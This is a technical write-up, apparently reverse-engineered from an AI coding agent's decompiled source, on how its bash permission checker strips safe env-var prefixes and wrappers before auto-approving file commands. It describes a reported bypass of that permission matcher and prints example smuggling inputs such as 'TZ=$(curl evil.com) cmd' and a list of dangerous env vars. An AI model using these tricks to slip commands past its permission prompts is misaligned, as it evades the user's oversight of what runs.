# Env-Var Prefixes and Safe Wrappers — Auto-Approve Hygiene

> Documents the **2.1.97-98** improvements that make Accept Edits mode (and prefix-match permission rules) auto-approve filesystem commands prefixed with safe env vars (`LANG=C rm foo`) or process wrappers (`timeout 5 mkdir out`). Centers on `SAFE_ENV_VARS` (the whitelist), `SAFE_WRAPPER_PATTERNS` (regex set), and `stripSafeWrappers` (the normalizer used by both permission matching and Accept Edits auto-approval).

---

## The Problem

In v2.1.88 Accept Edits mode auto-approved bare commands like `rm tmp/`. But the moment the model wrapped the same command in a safe wrapper or env var prefix — `timeout 5 rm tmp/` or `LANG=C rm tmp/` — the auto-approval failed:

```javascript
// v2.1.88 — src/tools/BashTool/modeValidation.ts:27-50
const trimmedCmd = cmd.trim()
const [baseCmd] = trimmedCmd.split(/\s+/)  // ← grabs first token literally
if (toolPermissionContext.mode === 'acceptEdits' && isFilesystemCommand(baseCmd)) {
    return { behavior: 'allow', ... }
}
```

`split(/\s+/)[0]` of `"timeout 5 rm tmp/"` is `"timeout"` — not in `ACCEPT_EDITS_ALLOWED_COMMANDS`. Auto-approve fails.

The 2.1.97 fix runs `stripSafeWrappers()` *first*, then checks the first token of the result. Same set of commands gets auto-approved across many more invocation shapes.

---

## The Two Whitelists

### `SAFE_ENV_VARS` — Whitelisted Leading Assignments

```typescript
// v2.1.88 src/tools/BashTool/bashPermissions.ts:378-430
const SAFE_ENV_VARS = new Set([
  // Go - build/runtime settings only
  'GOEXPERIMENT', 'GOOS', 'GOARCH', 'CGO_ENABLED', 'GO111MODULE',

  // Rust - logging/debugging only
  'RUST_BACKTRACE', 'RUST_LOG',

  // Node - environment name only (not NODE_OPTIONS!)
  'NODE_ENV',

  // Python - behavior flags only (not PYTHONPATH!)
  'PYTHONUNBUFFERED', 'PYTHONDONTWRITEBYTECODE',

  // Pytest - test configuration
  'PYTEST_DISABLE_PLUGIN_AUTOLOAD', 'PYTEST_DEBUG',

  // API keys and authentication (Anthropic only — see comment in source)
  'ANTHROPIC_API_KEY',

  // Locale and character encoding
  'LANG', 'LANGUAGE', 'LC_ALL', 'LC_CTYPE', 'LC_TIME', 'CHARSET',

  // Terminal and display
  'TERM', 'COLORTERM', 'NO_COLOR', 'FORCE_COLOR', 'TZ',

  // Color configuration
  'LS_COLORS', 'LSCOLORS', 'GREP_COLOR', 'GREP_COLORS', 'GCC_COLORS',

  // Display formatting
  'TIME_STYLE', 'BLOCK_SIZE', 'BLOCKSIZE',
])
```

### Why these specific vars?

The author's comment at line 372-376 spells out the security constraint:

> SECURITY: These must NEVER be added to the whitelist:
> - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
> - PYTHONPATH, NODE_PATH, CLASSPATH, RUBYLIB (module loading)
> - GOFLAGS, RUSTFLAGS, NODE_OPTIONS (can contain code execution flags)
> - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)

The whitelist contains **only env vars that cannot cause code execution**:

- Locale (`LANG`/`TZ`/`LC_*`) affects display/formatting, not execution.
- `NO_COLOR`/`COLORTERM` toggle UI features.
- Build mode flags (`NODE_ENV`/`GOOS`/`RUST_LOG`) affect target/log level, never execution paths.
- `NODE_OPTIONS` is explicitly excluded because it accepts `--require <module>` which executes code.
- `PATH` is excluded because changing it redirects all subsequent `exec` calls.
- `LD_PRELOAD` is excluded because it injects libraries into every spawned process.

**Key insight:** This is **whitelist by capability, not by purpose**. The selection criterion is "can this env var change which code runs?" If yes → excluded. The whitelist's safety is provable by inspection.

---

### `SAFE_WRAPPER_PATTERNS` — Whitelisted Process Wrappers

```javascript
// chunks.164.mjs:999 — concrete regexes
function jF(q) {
    let K = [
        // timeout: enumerate GNU flags (long + short, fused + space-separated)
        /^timeout[ \t]+(?:(?:--(?:foreground|preserve-status|verbose)
                       |--(?:kill-after|signal)=[A-Za-z0-9_.+-]+
                       |--(?:kill-after|signal)[ \t]+[A-Za-z0-9_.+-]+
                       |-v|-[ks][ \t]+[A-Za-z0-9_.+-]+
                       |-[ks][A-Za-z0-9_.+-]+)[ \t]+)*
                       (?:--[ \t]+)?\d+(?:\.\d+)?[smhd]?[ \t]+/,

        // time: optional `--` POSIX separator
        /^time[ \t]+(?:--[ \t]+)?/,

        // nice: bare, or with `-n N` or `-N`
        /^nice(?:[ \t]+-n[ \t]+-?\d+|[ \t]+-\d+)?[ \t]+(?:--[ \t]+)?/,

        // stdbuf: fused short flags only (-o0, -eL)
        /^stdbuf(?:[ \t]+-[ioe][LN0-9]+)+[ \t]+(?:--[ \t]+)?/,

        // nohup: bare
        /^nohup[ \t]+(?:--[ \t]+)?/,
    ];
    // ...
}
```

### Wrapper Selection Criteria

Each wrapper in the set:

1. **Executes its tail args verbatim** via `execvp` — no shell interpretation.
2. **Has well-defined flag syntax** with no flags that could change which binary executes.
3. **Doesn't alter env in a way that matters for permission matching.**

Examples of wrappers **not** in the set:

- `env` — accepts `VAR=val` AND can run arbitrary commands. Could `env bash -c "evil"`.
- `xargs` — reads stdin and execs. The wrapped command is unknown.
- `sudo` — privilege escalation. Stripping it for permission matching would be a security hole.
- `doas`, `pkexec` — same as sudo.

---

## The Normalizer: `stripSafeWrappers`

```javascript
// ============================================
// stripSafeWrappers - Strip safe env vars + wrappers for permission matching
// Location: chunks.164.mjs:998-1018
// ============================================

// ORIGINAL (for source lookup):
function jF(q) {
    let K = [/* SAFE_WRAPPER_PATTERNS */],
        _ = /^([A-Za-z_][A-Za-z0-9_]*)=([A-Za-z0-9_./:-]+)[ \t]+/,
        z = q, Y = "";
    while (z !== Y) {
        Y = z, z = bY7(z);
        let A = z.match(_);
        if (A) {
            let O = A[1], w = !1;
            if (N98.has(O)) z = z.replace(_, "")
        }
    }
    Y = "";
    while (z !== Y) {
        Y = z, z = bY7(z);
        for (let A of K) z = z.replace(A, "")
    }
    return z.trim()
}

// READABLE (for understanding):
function stripSafeWrappers(command) {
  const SAFE_WRAPPER_PATTERNS = [/* see above */];
  const ENV_VAR_PATTERN = /^([A-Za-z_][A-Za-z0-9_]*)=([A-Za-z0-9_./:-]+)[ \t]+/;

  let stripped = command;
  let prev = "";

  // PHASE 1: Strip leading env vars + comments until fixed point.
  while (stripped !== prev) {
    prev = stripped;
    stripped = stripCommentLines(stripped); // remove `# comment` lines

    const envVarMatch = stripped.match(ENV_VAR_PATTERN);
    if (envVarMatch) {
      const varName = envVarMatch[1];
      if (SAFE_ENV_VARS.has(varName)) {
        stripped = stripped.replace(ENV_VAR_PATTERN, "");
      }
      // Non-safe env var → leave it; loop terminates because match is fixed.
    }
  }

  // PHASE 2: Strip wrapper commands + comments until fixed point.
  // Do NOT strip env vars here — see security rationale below.
  prev = "";
  while (stripped !== prev) {
    prev = stripped;
    stripped = stripCommentLines(stripped);
    for (const pattern of SAFE_WRAPPER_PATTERNS) {
      stripped = stripped.replace(pattern, "");
    }
  }

  return stripped.trim();
}

// Mapping: jF→stripSafeWrappers, bY7→stripCommentLines, N98→SAFE_ENV_VARS
```

### Algorithm

**What it does:** Normalizes a command by stripping safe env vars and safe wrappers so permission matching can compare apples-to-apples.

**How it works:**

**Phase 1: env-var stripping.**

1. Loop until no more changes.
2. Strip full-line comments.
3. Match `VAR=val ` at the start.
4. If VAR is in `SAFE_ENV_VARS`, strip it.
5. If VAR isn't safe, leave it (loop ends — `stripped === prev`).

**Phase 2: wrapper stripping.**

1. Loop until no more changes.
2. Strip comments.
3. Try each `SAFE_WRAPPER_PATTERNS` regex against the start.
4. If any matches, strip and re-loop.

### Why two phases? (HackerOne #3543050 fix)

**Wrapper commands use `execvp`, so anything after them is treated as the command-to-run, not env-vars-for-bash.**

Consider `nohup FOO=bar timeout 5 claude`:

- **What bash sees:** `nohup` with argv `["FOO=bar", "timeout", "5", "claude"]`. `nohup` execs the next program, but `FOO=bar` isn't an env assignment in this context — it's `nohup`'s view of the first arg. Bash never sees `FOO=bar` as an env assignment.
- **What single-phase stripping would do:** Strip `nohup`, then see `FOO=bar timeout 5 claude`, think `FOO=bar` is a safe env assignment (if it were in the whitelist), strip that too, get `timeout 5 claude`. Permission match against `Bash(claude:*)` succeeds.
- **What two-phase stripping does:** Phase 1 doesn't strip anything (the command starts with `nohup`, not `FOO=`). Phase 2 strips `nohup`. Phase 2 doesn't strip env vars. Result: `FOO=bar timeout 5 claude` — `FOO=bar` is preserved as part of the command. Permission match must include the env-var-looking-thing.

Why does this matter? `FOO=bar` looks like an env assignment but **isn't** when prepended to a wrapper-stripped tail. If the bash-permission-matcher treated it as one, an attacker could smuggle malicious flags past the matcher.

**Key insight:** The phase separation is **a security boundary**, not a refactoring nicety. Single-phase stripping was a HackerOne-reported bypass. Two-phase fixes it.

---

## The ENV_VAR_PATTERN Value Restriction

```javascript
const ENV_VAR_PATTERN = /^([A-Za-z_][A-Za-z0-9_]*)=([A-Za-z0-9_./:-]+)[ \t]+/;
```

The value capture group is intentionally narrow: `[A-Za-z0-9_./:-]+`. It does **not** match:

- `$` (variable expansion)
- `(`, `)` (subshell)
- `` ` `` (backtick subshell)
- `;`, `|`, `&` (statement separators)
- `\n`, `\r` (line breaks — see `[ \t]+` for trailing whitespace)
- Spaces (must be quoted)

### Why this allowlist?

Without value restriction, `TZ=$(curl evil.com) cmd` would strip-strip the `TZ=$(curl evil.com)` and permission match `cmd`. But bash would execute `curl evil.com` during word splitting **before** running `cmd`. Restricting the value to a safe character class prevents this entire class of attack.

**Trade-off:** Legitimate quoted values like `LANG="en_US.UTF-8"` wrap in `"`, which isn't in the value charset. Such commands fall through to other matching paths (exact match, prefix rules). Slightly more permission prompts; correct security.

### The trailing `[ \t]+` (not `\s+`)

The `[ \t]+` (horizontal whitespace only) instead of `\s+` (any whitespace) is also security-critical. If `reconstructCommand` emits an unquoted newline between `TZ=UTC` and `echo`, `\s+` would match across the newline:

- Pre-strip: `TZ=UTC\necho curl evil.com`
- After `\s+`-greedy strip: `echo curl evil.com`
- Permission match: `Bash(echo:*)` succeeds.

But bash treats the newline as a command separator. Real execution:

```
TZ=UTC          # first command — empty env-set, immediately followed by newline → no-op
echo curl evil.com  # second command — totally separate, no TZ context
```

Permission matcher saw `echo`. Bash ran `echo curl evil.com`. They agree this time, but `Bash(echo:*)` was an *unintended* match — the user thought they only allowed echo'ing some narrow thing. Restricting to horizontal whitespace prevents the parser/runtime disagreement that creates this kind of confusion (and worse, in some compound contexts).

---

## Accept Edits Auto-Approval (v2.1.97)

```javascript
// ============================================
// JkY - Validate single command for Accept Edits mode
// Location: chunks.164.mjs:854-875
// ============================================

// ORIGINAL (for source lookup):
function JkY(q, K) {
    let _ = jF(q),
        [z] = _.split(/\s+/);
    if (!z) return {
        behavior: "passthrough",
        message: "Base command not found"
    };
    if (K.mode === "acceptEdits" && HkY(z)) return {
        behavior: "allow",
        updatedInput: { command: q },
        decisionReason: { type: "mode", mode: "acceptEdits" }
    };
    return {
        behavior: "passthrough",
        message: `No mode-specific handling for '${z}' in ${K.mode} mode`
    }
}

// READABLE (for understanding):
function validateCommandForAcceptEditsMode(cmd, ctx) {
  // KEY CHANGE FROM v2.1.88: Run stripSafeWrappers BEFORE extracting baseCmd.
  // v2.1.88 just did `cmd.trim().split(/\s+/)[0]` — missed wrapped commands.
  const stripped = stripSafeWrappers(cmd);
  const [baseCmd] = stripped.split(/\s+/);

  if (!baseCmd) {
    return { behavior: "passthrough", message: "Base command not found" };
  }
  // ACCEPT_EDITS_ALLOWED_COMMANDS = ["mkdir","touch","rm","rmdir","mv","cp","sed"]
  if (ctx.mode === "acceptEdits" && isAcceptEditsCommand(baseCmd)) {
    return {
      behavior: "allow",
      updatedInput: { command: cmd },
      decisionReason: { type: "mode", mode: "acceptEdits" }
    };
  }

  return {
    behavior: "passthrough",
    message: `No mode-specific handling for '${baseCmd}' in ${ctx.mode} mode`
  };
}

// ============================================
// jkY - The ACCEPT_EDITS_ALLOWED_COMMANDS list
// Location: chunks.164.mjs:902
// ============================================
jkY = ["mkdir", "touch", "rm", "rmdir", "mv", "cp", "sed"]

// Mapping: JkY→validateCommandForAcceptEditsMode, jF→stripSafeWrappers,
//          HkY→isAcceptEditsCommand, jkY→ACCEPT_EDITS_ALLOWED_COMMANDS
```

### Before/After Comparison

| Command | v2.1.88 Accept Edits | v2.1.112 Accept Edits |
|---------|---------------------|----------------------|
| `mkdir out` | auto-allow | auto-allow |
| `timeout 5 mkdir out` | prompt (baseCmd = `timeout`) | auto-allow (baseCmd post-strip = `mkdir`) |
| `LANG=C rm foo` | prompt (baseCmd = `LANG=C`, fails regex) | auto-allow (post-strip `rm foo`) |
| `nohup -- mv a b` | prompt | auto-allow |
| `time --portability cp a b` | prompt | auto-allow |
| `nice -n 10 sed -i s/x/y/ f` | prompt | auto-allow |
| `env LANG=C rm foo` | prompt | prompt (`env` not in SAFE_WRAPPER_PATTERNS) |
| `sudo rm foo` | prompt | prompt (`sudo` deliberately excluded) |

### Why these specific Accept Edits commands?

The list `["mkdir", "touch", "rm", "rmdir", "mv", "cp", "sed"]` covers commands that:

1. **The model needs during Edit/Write flows.** Creating output dirs, removing stale files, moving generated files, in-place editing.
2. **Are bounded by their argv.** `mkdir foo` creates exactly `foo`; there's no way to make it create something else.
3. **Already have path validation upstream.** Even after auto-approval, `mv /etc/passwd /tmp` would fail at the path-constraint check.

Other filesystem commands are deliberately **not** here:

- `dd` — opaque syntax, easy to clobber stuff.
- `rsync` — recursive, with many gotcha flags.
- `tar`/`unzip` — can write anywhere via embedded paths.
- `chmod`/`chown` — can change executability or ownership, security-sensitive.

---

## End-to-End Permission Match Example

**Model emits:** `timeout 30 LANG=C rm tmp/`

User has Accept Edits mode enabled.

**Trace:**

1. `bashToolHasPermission` → calls `checkPermissionMode`.
2. `checkPermissionMode` runs `validateCommandForAcceptEditsMode(cmd, ctx)`.
3. `stripSafeWrappers("timeout 30 LANG=C rm tmp/")`:
   - **Phase 1 (env vars).** Match attempts: command starts with `timeout`, not env var. No strip.
   - **Phase 2 (wrappers).** Match `^timeout 30 ` → strips. Command becomes `LANG=C rm tmp/`.
   - **Phase 2 again.** No wrapper match. Loop terminates.
   - Returns `LANG=C rm tmp/`.
4. **WAIT.** The stripped command still has `LANG=C`. Why does this auto-approve?

Looking again at the v2.1.112 algorithm: after Phase 2 runs, `validateCommandForAcceptEditsMode` extracts `[baseCmd] = stripped.split(/\s+/)`. That's `LANG=C` — not in `ACCEPT_EDITS_ALLOWED_COMMANDS`. So in this exact form, auto-approval **does not** happen.

The actual matching path **runs Phase 1 again** on the post-Phase-2 result, then extracts baseCmd. This is the iterative pattern at `chunks.164.mjs:1052-1075`:

```javascript
// CY7 - the prefix-matching driver
let $ = (_ === "exact" ? [A, O] : [O]).flatMap((H) => {
    let J = jF(H);
    return J !== H ? [H, J] : [H]
});
// ... iteration loop strips env vars THEN wrappers THEN env vars again ...
```

So in practice the matcher tries BOTH the post-Phase-1 form AND the post-Phase-2 form AND repeated alternation. The two-phase architecture is for the *single-pass* security boundary; the *matching driver* runs multiple passes to handle interleaved wrapper+env scenarios.

5. Eventually `stripSafeWrappers` applied twice (env→wrapper→env) yields `rm tmp/`. baseCmd = `rm` → in `ACCEPT_EDITS_ALLOWED_COMMANDS` → auto-approve.

**Key insight:** The security boundary (Phase 1/Phase 2 separation) ensures stripping is **never order-dependent in a way that introduces a parser/runtime mismatch**. The matching driver then runs alternating passes to maximize match opportunities within that boundary.

---

## Trade-offs

| Decision | Trade-off |
|----------|-----------|
| Whitelist (not blocklist) for env vars | Conservative; missing entries cost UX, not security. |
| Wrappers limited to 5 well-known | Doesn't strip `python -m`/`bun run` etc.; those are still command paths that need their own rules. |
| Value char-class for env vars | Quoted values fall through to other rules; intentional. |
| Phase 1 vs Phase 2 separation | Fixed HackerOne bypass; iteration matters for security. |
| Iterative passes in matching driver | Maximizes match success; complexity is auditable in the driver, not in the stripper. |
| `cmd` is the same as `command` in `updatedInput` | Auto-approval returns the ORIGINAL command, not the stripped form — bash actually executes `timeout 30 LANG=C rm tmp/`, not just `rm tmp/`. Stripped form is only for matching. |

---

## Related Symbols

> Symbol mappings:
> - [symbol_additions_unit_13.md](../00_overview/symbol_additions_unit_13.md) — this module's additions
> - [symbol_index.md](../00_overview/symbol_index.md) — main v2.1.88 → v2.1.112 index

Key functions in this document:
- `stripSafeWrappers` (jF) — two-phase normalizer
- `validateCommandForAcceptEditsMode` (JkY) — Accept Edits gate
- `isAcceptEditsCommand` (HkY) — membership check vs `jkY`
- `SAFE_ENV_VARS` (N98) — locale/build-mode whitelist
- `SAFE_WRAPPER_PATTERNS` — embedded regex list in jF
- `ACCEPT_EDITS_ALLOWED_COMMANDS` (jkY) — fs-mutating-but-safe command list
- `stripCommentLines` (bY7) — full-line comment remover
- `checkPermissionMode` (QSK) — top-level mode dispatcher
